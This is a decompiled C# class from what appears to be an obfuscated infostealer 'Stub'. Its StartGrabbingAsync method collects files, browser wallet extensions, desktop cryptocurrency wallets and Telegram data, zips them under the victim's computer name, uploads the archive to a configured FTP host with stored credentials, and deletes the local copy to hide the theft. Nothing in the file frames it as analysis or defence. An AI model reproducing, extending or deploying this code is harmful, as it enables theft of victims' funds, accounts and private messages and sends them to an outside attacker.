using System;
using System.IO;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200004D RID: 77
	internal sealed class GrabbedFiles
	{
		// Token: 0x0600016F RID: 367 RVA: 0x00012B2C File Offset: 0x00010D2C
		public static async Task StartGrabbingAsync()
		{
			await FileGrabber.RunAsync();
			if (Config.BrowserWallets == "1")
			{
				BrowserWallets.RunAllWalletExtraction();
			}
			if (Config.Telegram == "1")
			{
				Telegram.SaveTelegramData();
			}
			if (Config.DesktopWallets == "1")
			{
				DesktopWallets.GetWallets();
			}
			string grabberFolderPath = Path.Combine(Paths.InitWorkDir(), "Grabber");
			if (!Directory.Exists(grabberFolderPath))
			{
				Logging.Log("No Grabber folder found to archive.", true);
			}
			else
			{
				string zipFileName = string.Format("Grabber_{0}_{1:yyyyMMdd_HHmmss}.zip", SystemInfo.Compname, DateTime.Now);
				string zipPath = Path.Combine(Paths.InitWorkDir(), zipFileName);
				Filemanager.CreateArchive(grabberFolderPath, zipPath);
				Logging.Log("ZIP created: " + zipPath, true);
				try
				{
					await GrabberUpload.UploadFileToGrabberFtpAsync(Config.GrabberHost, Config.GrabberUser, Config.GrabberPass, zipPath, true, true);
					Logging.Log("Uploaded to FTP.", true);
					File.Delete(zipPath);
					Logging.Log("ZIP deleted locally.", true);
				}
				catch (Exception ex)
				{
					Logging.Log("FTP Upload Failed: " + ex.Message, true);
					throw;
				}
			}
		}

		// Token: 0x06000170 RID: 368 RVA: 0x000038B4 File Offset: 0x00001AB4
		public GrabbedFiles()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000171 RID: 369 RVA: 0x000038AD File Offset: 0x00001AAD
		static GrabbedFiles()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
